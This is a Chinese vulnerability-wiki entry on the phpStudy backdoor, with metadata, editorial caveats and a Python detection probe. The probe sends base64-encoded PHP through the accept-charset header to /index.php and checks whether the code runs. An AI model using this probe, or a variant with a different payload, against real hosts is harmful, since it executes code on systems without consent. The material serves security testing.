---
source: "白阁文库 BaizeSec/bylibrary"
title: "phpstudy_backdoor"
product: "Compromised phpStudy packages"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "Malicious DLL loaded;reachable PHP index endpoint;version/provenance absent"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-90bd3173dea0523e892320be"
entity_id: "ve-90bd3173dea0523e892320be"
schema_version: "1"
---

# phpstudy_backdoor

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：Malicious DLL loaded;reachable PHP index endpoint;version/provenance absent
- 证据范围：Marker execution probe returns status but main never prints result

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- Code fence labeledHTML thoughPython;no title/description/version context
- Exceptions classified 'not present' instead of inconclusive
- Probe executesPHP rather than passive integritycheck;label sideeffects
- Same mechanism as70 but separate detector variant;link instead of dropping rich analysis

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

```HTML
#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: phpstudy后门
referer: unknown
author: qianxiao996
description: phpstudy后门探测
'''
import sys
import requests
import warnings
import base64
def run(url):
        result = ['phpstudy后门', '', '']
        payload = "echo \"testdoor\";"
        payload = base64.b64encode(payload.encode('utf-8'))
        payload = str(payload, 'utf-8')
        headers = {
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'accept-charset': payload,
            'Accept-Encoding': 'gzip,deflate',
            'Connection': 'close',
        }
        try:
            req = requests.get(url=url+'/index.php', headers=headers, verify=False,timeout=30)
            if "testdoor" in req.text:
                result[2]=  '存在'
            else:
                result[2]=  '不存在'
        except:
            result[2]=  '不存在'
        # print(result)
        return result
if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])

```


---

> 来源：白阁文库 BaizeSec/bylibrary
